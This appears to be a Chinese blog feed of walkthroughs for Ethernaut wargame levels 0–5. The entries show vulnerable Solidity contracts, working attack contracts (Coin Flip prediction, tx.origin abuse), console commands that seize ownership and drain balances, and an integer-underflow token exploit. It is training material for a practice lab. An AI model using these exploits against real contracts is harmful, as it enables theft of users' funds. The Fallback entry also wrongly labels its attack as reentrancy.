        <content type="html"><![CDATA[<h1 id="Hello-Ethernaut第0关练习"><a href="#Hello-Ethernaut第0关练习" class="headerlink" title="Hello Ethernaut第0关练习"></a>Hello Ethernaut第0关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>熟悉关卡，另有一个熟悉代码的教程：<a href="https://cryptozombies.io/zh/"></a><a href="https://cryptozombies.io/zh/">CryptoZombies</a></p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><p>无</p><h2 id="游戏基础教学："><a href="#游戏基础教学：" class="headerlink" title="游戏基础教学："></a>游戏基础教学：</h2><p>题目上有详细步骤，</p><ol><li><p>通过谷歌浏览器下载meta mask插件，按照他的步骤设置meta mask钱包，记住当时的助记码，使用rinbeby网络</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730112253313.png"></p></li><li><p>通过水龙头获取一些测试币，ethernaut游戏是rinkeby网络<a href="https://faucet.rinkeby.io/">这个 faucet</a>。获取的流程是通过推特发送一个条含有你钱包的地址的推特然后将推特的链接复制下来粘贴到水龙头网站上，（完成整个游戏大概只需要10eth，因为是测试币，多了没用）如图：</p></li></ol><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730112428497.png"><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730112649378.png"></p><p>3、然后按F12打开开发者工具中的控制台，输入player,回车</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730113113231.png"></p><p>4、这些功能都可以看一下做一下：</p><pre><code>player//玩家地址getBalance(player)//玩家余额help()//帮助文档instance或contract.address()//合约地址await ethernaut.owner//部署合约的所有者，我们常用await让代码更简洁直观，下图有对比await contract.abi//查看他的应用二进制接口有哪些</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730113705393.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730113906895.png"></p><p>5、见面关是有题目的<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730114140701.png"></p><p>我们按照步骤走</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730114812158.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115115264.png"></p><p>6、付gas费，有时候可能会因为网络问题导致比较慢，耐心点等，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115340988.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115220065.png"></p><p>7、这样就算是完成交易了，浏览器会有弹窗，confirmed就代表交易成功，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115609324.png"></p><p>8、点击提交实例，再付一次gas费，就可以看到，这一关就结束了，下一关</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115641708.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730115951387.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fall Out第1关练习</title>
      <link href="//Ethernaut/Ethernaut/1.Ethernaut-Fallback/"/>
      <url>//Ethernaut/Ethernaut/1.Ethernaut-Fallback/</url>
      
        <content type="html"><![CDATA[<h1 id="Fall-back第1关练习"><a href="#Fall-back第1关练习" class="headerlink" title="Fall back第1关练习"></a>Fall back第1关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>仔细查看下面的合约代码。</p><p>你会打败这个级别，如果</p><ol><li>您声称拥有合同的所有权</li><li>您将其余额减少到 0</li></ol><p> 可能有帮助的事情</p><ul><li>与 ABI 交互时如何发送以太币</li><li>如何在 ABI 之外发送以太币</li><li>wei/ether 单位之间的相互转换 - 参见 help() 命令 -</li><li>回退方法</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallback {//Fallback合约继承自Ownable合约  using SafeMath for uint256;  mapping(address =&gt; uint) public contributions;  //通过映射,可以使用地址获取贡献的值  address payable public owner;  constructor() public {    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  }//构造函数设置合约创建者的贡献值为1000以太币  modifier onlyOwner {        require(            msg.sender == owner,            "caller is not the owner"        );        _;    }  function contribute() public payable {    require(msg.value &lt; 0.001 ether);//每次贡献的值小于0.001以太币    contributions[msg.sender] += msg.value;//累计起来    if(contributions[msg.sender] &gt; contributions[owner]) {      owner = msg.sender;    }//当你贡献的值大于1000的时候就你成为合约所有者  }  function getContribution() public view returns (uint) {    return contributions[msg.sender];  }//获取你的贡献值  function withdraw() public onlyOwner {    owner.transfer(address(this).balance);  }//onlyOwner修饰,所以只有合约所有者才能用来提款  fallback() external payable {    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零    owner = msg.sender;//msg.sender就是调用者,也就是我们    //执行这一条语句owner就成了我们  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>合约构造函数 Fallback() 中初始化拥有者贡献度为 1000 ether。<br>我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。<br>但在 contribute() 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。</p><p>那应该怎么办呢？这里是重入攻击的关键，同时也是The DAO事件里黑客所用到的攻击。</p><p>思路：首先贡献一点金额，来通过 require 触发 fallback 函数，来成为合约的所有者，然后 withdraw 函数转走合约中的所有钱</p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html?highlight=transfer#fallback">可以参考官网对fallback的描述</a></p><p><code>fallback</code> 函数被调用的情况有两种</p><ul><li>调用合约中不存在的函数</li><li>当合约收到以太币（没有任何数据）</li></ul><p>此外，为了接收以太币，<code>fallback</code> 函数必须标记为 <code>payable</code>。</p><p>也就是说想要满足题目要求，先成为owner，这里能够做到</p><pre><code class="solidity">fallback() external payable {    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零    owner = msg.sender;//msg.sender就是调用者,也就是我们    //执行这一条语句owner就成了我们  }</code></pre><p>其实成为 owner 还有另一种方式，我们仔细看合约的 fallback 函数，即最下方的无名函数。<strong>当合约账户收到一笔转账时会自动调用 fallback 函数</strong>。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。要满足<code>contributions[msg.sender]&gt;0</code>首先需要通过<code>contribute</code>函数给到<code>contributions[msg.sender]</code>1wei,这里可以了解一下help()相关的信息<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101232782.png"></p><p>可以了解下<a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">wei和ether</a>，</p><p>第二个要求，通过withdraw函数将来实现</p><pre><code>  function withdraw() public onlyOwner {    owner.transfer(address(this).balance);  }//onlyOwner修饰,所以只有合约所有者才能用来提款</code></pre><p>接下来进入实例吧</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击获取新实例，meta mask提交gas以后在控制台，查看以下信息，玩家地址，合约地址，实例余额，合约拥有者，（注意：每支付完一笔gas费都要稍等片刻，等待交易）</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728095637344.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101832333.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728095736638.png"></p><p>2、要满足题目要求<code>contributions[msg.sender]&gt;0</code>我们使用</p><pre><code>contract.contribute({value: 1})</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101823453.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728101940334.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728102151994.png"></p><p>3、上面就完成了第一步，接着我们触发fallback函数，触发 fallback 函数的条件：</p><ul><li>当调用一个不存在的函数的时候</li><li>发送没有数据的纯 ether 时</li></ul><pre><code>contract.sendTransaction({value: 1})</code></pre><p>楼上说了当合约账户收到一笔转账时会自动调用 fallback 函数，</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728102450233.png"></p><p>这时候合约收到了2wei，合约余额是2wei，触发了fallback函数，owner变成了我们自己，就是<code>msg.sender</code>。</p><p>4、第二个要求，使用了withdraw使用了transfer()函数实现</p><pre><code>contract.withdraw() </code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728104354780.png"></p><p>这时候目标完成，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728104451929.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728104608313.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fall Back第2关练习</title>
      <link href="//Ethernaut/Ethernaut/2.Ethernaut-Fall%20out/"/>
      <url>//Ethernaut/Ethernaut/2.Ethernaut-Fall%20out/</url>
      
        <content type="html"><![CDATA[<h1 id="Fall-out第2关练习"><a href="#Fall-out第2关练习" class="headerlink" title="Fall out第2关练习"></a>Fall out第2关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li><p>您声称拥有合同的所有权</p></li><li><p>Rubixi 的故事是以太坊生态系统中一个非常有名的案例。该公司将其名称从“动态金字塔”更改为“Rubixi”，但不知何故他们没有重命名其合约的构造函数方法：</p><pre><code>contract Rubixi {  address private owner;  function DynamicPyramid() { owner = msg.sender; }  function collectAllFees() { owner.transfer(this.balance) }  ...</code></pre><p>这允许攻击者调用旧的构造函数并声明合约的所有权，并窃取一些资金。是的。智能合约领域可能会犯大错误。</p></li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Fallout {    using SafeMath for uint256;  mapping (address =&gt; uint) allocations;  address payable public owner;  /* constructor */  function Fal1out() public payable {//这个public的函数并不是构造函数(l与1)...直接调用就可以了    owner = msg.sender;//这条语句就能让我们成为合约所有者    allocations[owner] = msg.value;  }  modifier onlyOwner {            require(                msg.sender == owner,                "caller is not the owner"            );            _;        }  function allocate() public payable {    allocations[msg.sender] = allocations[msg.sender].add(msg.value);  }  function sendAllocation(address payable allocator) public {    require(allocations[allocator] &gt; 0);    allocator.transfer(allocations[allocator]);  }  function collectAllocations() public onlyOwner {    msg.sender.transfer(address(this).balance);  }  function allocatorBalance(address allocator) public view returns (uint) {    return allocations[allocator];  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><ul><li>我们可以发现一个很明显的问题，理论上应该写成 <code>Fallout</code> 的构造函数被写成了 <code>Fal1out</code> ，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。</li></ul><p>并且可以看见<code>owner = msg.sender</code>，直接达到我们的目的，所以直接调用查看owner即可</p><pre><code>await contract.Fal1out()//调用Fal1out()函数await contract.owner()//查看当前合约拥有者</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730110723192.png"></p><p>2、查看玩家地址，合约地址，查看一下合约拥有者</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730110746115.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730111106753.png"></p><p>3、调用Fal1out()函数，付gas费，查看当前合约拥有者已变成我们玩家自己</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730110927346.png"></p><p>4、快乐提交去吧</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730111156531.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coin Flip第3关练习</title>
      <link href="//Ethernaut/Ethernaut/3.Ethernaut-Coin%20Filp/"/>
      <url>//Ethernaut/Ethernaut/3.Ethernaut-Coin%20Filp/</url>
      
        <content type="html"><![CDATA[<h1 id="Coin-Flip第3关练习"><a href="#Coin-Flip第3关练习" class="headerlink" title="Coin Flip第3关练习"></a>Coin Flip第3关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>这是一个掷硬币游戏，你需要通过猜测掷硬币的结果来建立你的连胜记录。要完成这一关，你需要使用你的心理能力连续10次猜测正确的结果。</li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">pragma solidity ^0.4.18;import 'openzeppelin-solidity/contracts/math/SafeMath.sol'; contract CoinFlip {  using SafeMath for uint256;  uint256 public consecutiveWins;//连胜次数  uint256 lastHash;//上一个hash  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    //这个数是2^255  function CoinFlip() public {    consecutiveWins = 0;  }//构造函数，每次开始把赢的次数归零   function flip(bool _guess) public returns (bool) {    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));        //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了    if (lastHash == blockValue) {      revert();//如果最后的hash等于计算出来的    }//中止执行并将所做的更改还原为执行前状态     lastHash = blockValue;//改成上个区块的hash值为这个区块的    uint256 coinFlip = blockValue.div(FACTOR);    //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1    //因为除法运算会取整,所以coinFlip由blockValue的最高位决定    bool side = coinFlip == 1 ? true : false;     if (side == _guess) {      consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一      return true;    } else {      consecutiveWins = 0;//否则归零      return false;    }  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>我们先通读一下全文。首先定义了一个CoinFlip这个合约，然后引用了SafeMath这个库，定义了变量。在后面定义了结构consecutiveWins = 0。然后我们看看函数flip写了什么，首先输入一个布尔的值。那么参数_guess可控。uint256 blockValue = uint256(blockhash(block.number.sub(1)))。block.number表示当前区块数，然后减一。就是上一块。blockhash表示区块的hash，然后转换成uint256.然后判断lastHash == blockValue是否相等，如果等于了就回滚。</p><p>这里的意思就是不能重复上次的区块。然后获取到blockValue又赋值给lastHash，就相当于你要连续猜对10次才能通关。uint256 coinFlip = blockValue.div(FACTOR);这里把值赋给coinFlip，bool side = coinFlip == 1 ? true : false;这里的意思是判断coinfilp是否为1，如果不为1返回ture或者false给side。然后在到后面的if中，如果我们输入的值，等于就consecutiveWins++;直到consecutiveWins&gt;10.否则失败。这里我们构造一个攻击合约，类似中间人，因为答案可以预测嘛，我们可以把得到的答案发送给原合约。</p><p>exp 如下，把 exp 代码复制到 remix IDE 中，部署 exploit 合约（要用之前得到的那个合约地址）</p><pre><code>pragma solidity ^0.4.18;import './SafeMath.sol'; contract CoinFlip {  using SafeMath for uint256;  uint256 public consecutiveWins;//连胜次数  uint256 lastHash;//上一个hash  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    //这个数是2^255  function CoinFlip() public {    consecutiveWins = 0;  }//构造函数，每次开始把赢的次数归零   function flip(bool _guess) public returns (bool) {    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));        //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了    if (lastHash == blockValue) {      revert();//如果最后的hash等于计算出来的    }//中止执行并将所做的更改还原为执行前状态     lastHash = blockValue;//改成上个区块的hash值为这个区块的    uint256 coinFlip = blockValue.div(FACTOR);    //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1    //因为除法运算会取整,所以coinFlip由blockValue的最高位决定    bool side = coinFlip == 1 ? true : false;     if (side == _guess) {      consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一      return true;    } else {      consecutiveWins = 0;//否则归零      return false;    }  }}contract attack{    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    CoinFlip expFlip = CoinFlip(0x199fc78CC3057E5199184E8099C92E481d119f7a);  //这表示已经有一个CoinFlip合约部署在了这个地址    function pwn() public{         uint256 blockValue = uint256(block.blockhash(block.number-1));          uint256 coinFlip = blockValue /FACTOR;          bool side = coinFlip == 1 ? true : false;          expFlip.flip(side);    }}</code></pre><p>常用的SafeMath.sol也可以贴一下</p><pre><code>//SafeMath.solpragma solidity ^0.4.18;library SafeMath {  function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a / b;    return c;  }  function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b &lt;= a);    return a - b;  }  function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c &gt;= a);    return c;  }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击“Get new Instance”来获取一个实例。然后拿到合约的地址以及 consecutiveWins 的值</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730121209424.png"></p><p>2、在 <a href="http://remix.ethereum.org/">http://remix.ethereum.org</a> 部署我们的合约，先新建一个workspaces自己命名然后再其contracts目录下（也可以自己新建文件夹）新建两个sol文件并命名，将上面代码复制过去</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730121511130.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730121844331.png"></p><p>将solidity版本修改成为一样的0.4.18版本</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730122546013.png"></p><p>compile绿色黄色说明是小问题，红色需要找到报错的代码进行对应的修改，进行deploy，注意图中的Injected Web3，对应的CONTRACT,再点击Deploy,付gas费，稍等片刻成功以后会看到下面出现一个pwn函数<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730122837903.png"></p><p>3、点击pwn，付gas费，不要急，慢慢等成功<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123313405.png"></p><p>可以再console中检查一下是否成功，有1次了，说明成功了，我们执行到10次，记住不要急，一个一个慢慢来<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123357768.png"></p><p>4、钱包里面可以看到状态<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123622136.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123938873.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730123929511.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124025063.png"></p><p>我们这里是失败了一次，没关系我们继续pwn，gaslimit也可以自己调整一个合适的值，要比钱包活动中pwn的数量大一些，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124306887.png"></p><p>有时候默认的燃料不够会导致失败，我们就设置成50000就没问题<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124501782.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124619398.png"></p><p>5、直到数值变成10，我们就可以提交实例了</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210730124754791.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telephone第4关练习</title>
      <link href="//Ethernaut/Ethernaut/4.Ethernaut-Telephone/"/>
      <url>//Ethernaut/Ethernaut/4.Ethernaut-Telephone/</url>
      
        <content type="html"><![CDATA[<h1 id="Telephone第4关练习"><a href="#Telephone第4关练习" class="headerlink" title="Telephone第4关练习"></a>Telephone第4关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>获取合约的权限</li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Telephone {  address public owner;  constructor() public {    owner = msg.sender;  }//构造函数,部署的人是合约的所有者  function changeOwner(address _owner) public {    if (tx.origin != msg.sender) {      owner = _owner;    }//最初调用合约的人与调用者不一样的话,就把合约的所有者改成_owner  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>观察合约，我们的目的是要获取合约的权限，所以观察合约中是否有owner = msg.sender。发现一处是在构造函数中，把owner赋值给合约的创建者，检查构造函数没有问题。接下来我们查看changeOwner函数中的if (tx.origin != msg.sender) ,其中tx.origin表示最初交易发起人，msg.sender表示消息的发起人,举个栗子：</p><p>假设这样一条调用链：A -&gt; B -&gt; C -&gt; D，其中D 的 msg.sender 是 C，其 tx.origin 为 A。</p><p>如果在同一个合约中使用的话，他们tx.origin=msg.sender，如果在多合约的情况下，比如用户A通过合约来调用B合约，那么对于B合约来说，msg.sender就是合约A，tx.origin是用户，实际使用中，应该避免使用tx.origin(1,之后可能被废弃2，容易引发安全问题)</p><p>所以只要tx.origin不等于msg.sender，我们就可以调用changeOwner替换掉owner，所以构造这样一个合约：</p><pre><code class="solidity">pragma solidity ^0.5.0;contract Telephone {  address public owner;  constructor() public {    owner = msg.sender;  }  function changeOwner(address _owner) public {    if (tx.origin != msg.sender) {      owner = _owner;    }//最初调用合约的人与调用者不一样的话,就把合约的所有者改成_owner  }}contract exp{    Telephone a = Telephone(输入你的实例地址);    function hack() public{        a.changeOwner(msg.sender);    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击“Get new Instance”来获取一个实例。</p><p>2、输入contract.address来获取合约地址，用输出的合约地址替换以下合约中的地址在remix中编译合约：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723132604842.png"></p><pre><code class="solidity">pragma solidity ^0.5.0;contract Telephone {  address public owner;  constructor() public {    owner = msg.sender;  }  function changeOwner(address _owner) public {    if (tx.origin != msg.sender) {      owner = _owner;    }  }}contract exp{    Telephone a = Telephone(0x66be5c7AD850F3742A727fA0Ac35258831b437B5);    function hack() public{        a.changeOwner(msg.sender);    }}</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723142522932.png"></p><p>3、点击hack稍等片刻，查看原合约中的owner的地址：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723142731570.png"></p><p>4、提交，收获胜利</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723143005250.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Token第5关练习</title>
      <link href="//Ethernaut/Ethernaut/5.Ethernaut-Token/"/>
      <url>//Ethernaut/Ethernaut/5.Ethernaut-Token/</url>
      
        <content type="html"><![CDATA[<h1 id="Token第5关练习"><a href="#Token第5关练习" class="headerlink" title="Token第5关练习"></a>Token第5关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>首先会给你20个token，想办法去获得更多的Token!</li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token {  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public {    balances[msg.sender] = totalSupply = _initialSupply;  }//构造函数,在一开始给合约一些钱  function transfer(address _to, uint _value) public returns (bool) {    require(balances[msg.sender] - _value &gt;= 0);//先检查调用者的余额是不是大于转账金额    balances[msg.sender] -= _value;//调用的人减金额_value    balances[_to] += _value;//给目标增加金额_value    return true;  }//转账  function balanceOf(address _owner) public view returns (uint balance) {    return balances[_owner];  }//查询余额}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>可以看到两个函数，一个是transfer，一个是balanceOf,构造函数定义了totalSupply。可控点是address,value。在transfer函数中有一处”require“校验，此处可以通过”整数下溢“来绕过检查，同时这里的balances和value都是无符号整数，以加减法为例，在 Solidity 中 <code>(2**256 - 1) + 1 = 0</code> ， <code>0 - 1 = 2**256 - 1</code> 。目标合约中如果我们传入的 value 大于 20，则 <code>balances[msg.sender] - _value</code> 会溢出变成极大数，如此可以顺利通过 require 检验，并使得发送者获得天量代币。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723151124207.png"></p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击“Get new Instance”来获取一个实例。</p><p>2、查看初始化玩家的token数量，玩家地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723152041659.png"></p><p>3、输入<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723153050824.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723153105977.png"></p><p>这时候发生了一个情况rinkeby网络出现拥堵，存在一些问题无法使用，于是我们转到remix上进行</p><p>将代码复制到remix中点击</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726165519951.png"></p><p>initialSupply输入20点击Deploy<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726165722606.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726171531545.png"></p><p>查看到存在的Token为20，输入transfer中参数，输入其他任意地址和21，即可产生整数溢出，点击transfer,查看balanceOf</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726171636444.png"></p><p>在网的话就顺利提交即可</p><p>好的亲爱的朋友们，可能是我的metamask钱包卡住了，我们尝试重设一下钱包，继续试试吧</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101254076.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101454766.png"></p><p>get new instance后查看余额，输入contract.transfer(“0x8E27dCd7218F2C673A01Aa432707eBA771E6cb9E”,21)<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101948428.png"></p><p>直接输入可能会报错，可能是存在编译上的问题，我们加上引号就行。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101829645.png"></p><p>确认以后查看balanceOf，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727102041869.png">开启代币土豪生涯</p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delegation第6关练习</title>
      <link href="//Ethernaut/Ethernaut/6.Ethernaut-Delegation/"/>
      <url>//Ethernaut/Ethernaut/6.Ethernaut-Delegation/</url>
      
